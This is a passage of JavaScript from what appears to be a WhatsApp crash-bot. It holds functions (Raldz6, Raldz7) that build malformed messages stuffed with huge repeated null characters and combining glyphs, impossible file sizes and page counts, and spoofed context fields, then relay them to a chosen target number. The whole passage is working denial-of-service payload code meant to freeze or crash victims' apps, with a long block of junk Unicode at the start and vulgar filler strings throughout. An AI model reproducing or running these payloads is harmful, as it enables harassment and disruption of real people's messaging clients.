̷⃨ۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗ⃛".repeat(5) + "ꦾ".repeat(27777),
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "\u0000".repeat(911001),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "\u0000".repeat(911001),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u0000".repeat(990100),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u0000".repeat(990100),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u0000".repeat(990100),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u0000".repeat(990100),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u0000".repeat(990100),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u0000".repeat(990100),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u0000".repeat(990100),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u0000".repeat(990100),
                },
              ],
            },
          },
        },
      },
    };

    await conn.relayMessage(target, message, {
      participant: { jid: target },
    });
  } catch (err) {
    console.log(err);
  }
}
async function Raldz6(target, Ptcp = true) {
  const stanza = [
    {
      attrs: { biz_bot: "1" },
      tag: "bot",
    },
    {
      attrs: {},
      tag: "biz",
    },
  ];

  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "[👾] 𝗥̷̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡ 𝗔̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡ 𝗟̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡ 𝗗̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡ 𝗭̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡\n" + "ꦽꦾ".repeat(27000),
          listType: 2,
          singleSelectReply: {
            selectedRowId: "🩸",
          },
          contextInfo: {
            stanzaId: conn.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [target],
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                  fileLength: "9999999999999",
                  pageCount: 3567587327,
                  mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                  fileName: "༿༑ᜳ⁑⃟𝗥𝗔༽𝗟𝗗𝗭𝗭͢𑲭͠𝗫꙰༽𝗬𝗭​᭄̬͠͠ᢶ",
                  fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                  directPath:
                    "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1735456100",
                  contactVcard: true,
                  caption:
                    "\u0011",
                },
                contentText: '\u0008',
                footerText: "\u0007",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(550),
                    buttonText: {
                      displayText: "\u0009",
                    },
                    type: 1,
                  },
                ],
                headerType: 3,
              },
            },
            conversionSource: "porn",
            conversionData: crypto.randomBytes(16),
            conversionDelaySeconds: 9999,
            forwardingScore: 999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " x ",
              mediaType: "IMAGE",
              jpegThumbnail: { url: 'https://files.catbox.moe/w1isit.jpg' },
              caption: " x ",
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            ephemeralSharedSecret: crypto.randomBytes(16),
            entryPointConversionSource: "kontols",
            entryPointConversionApp: "kontols",
            actionLink: {
              url: "t.me/RaldzzXyz",
              buttonTitle: "konstol",
            },
            disappearingMode: {
              initiator: 1,
              trigger: 2,
              initiatorDeviceJid: target,
              initiatedByMe: true,
            },
            groupSubject: "kontol",
            parentGroupJid: "kontolll",
            trustBannerType: "kontol",
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {
              title: 'Dracula?',
              mediaType: 2,
              renderLargerThumbnail: false,
              showAdAttribution: false,
              containsAutoReply: false,
              body: "©Originial_Bug",
              thumbnail: { url: 'https://files.catbox.moe/w1isit.jpg' },
              sourceUrl: "Terawehsono",
              sourceId: "x - problem",
              ctwaClid: "cta",
              ref: "ref",
              clickToWhatsappCall: true,
              automatedGreetingMessageShown: false,
              greetingMessageBody: "kontol",
              ctaPayload: "cta",
              disableNudge: true,
              originalImageUrl: "konstol",
            },
            featureEligibilities: {
              cannotBeReactedTo: true,
              cannotBeRanked: true,
              canRequestFeedback: true,
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363330344810280@newsletter",
              serverMessageId: 1,
              newsletterName: `${"أ".repeat(77)}`,
              contentType: 3,
              accessibilityText: "kontol",
            },
            statusAttributionType: 2,
            utm: {
              utmSource: "utm",
              utmCampaign: "utm2",
            },
          },
          description: "KROCO",
        },
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16),
          }),
        },
      },
    },
  };

  await conn.relayMessage(target, messagePayload, {
    additionalNodes: stanza,
    participant: { jid: target },
  });
}
async function Raldz7(target, Ptcp = true) {
    let virtex = "[☣️] 𝗥̷̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡ 𝗔̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡ 𝗟̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡ 𝗗̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡ 𝗭̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡\n" + "ꦾ".repeat(49000);
    await conn.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: "\u0009".repeat(100),
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
